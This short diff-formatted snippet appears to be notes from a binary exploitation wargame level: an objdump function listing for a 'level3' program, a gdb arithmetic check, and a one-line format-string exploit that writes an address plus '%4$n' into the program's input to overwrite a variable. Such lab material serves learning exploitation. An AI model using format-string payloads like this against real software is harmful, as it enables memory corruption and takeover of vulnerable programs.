@@ -1,0 +1,15 @@
+
+$ objdump -d `ls` | grep '<.*>:' | grep -v '<_.*>:'
+08048380 <printf@plt-0x10>:
+08048390 <printf@plt>:
+080483a0 <fgets@plt>:
+080483b0 <fwrite@plt>:
+080483c0 <system@plt>:
+08048480 <frame_dummy>:
+080484a4 <v>:
+0804851a <main>:
+
+(gdb) print 0x40
+$4 = 64
+
+cat <(python -c 'print "\x08\x04\x98\x8c"[::-1] + "A"*60 + "%4$n"') - | ./level3
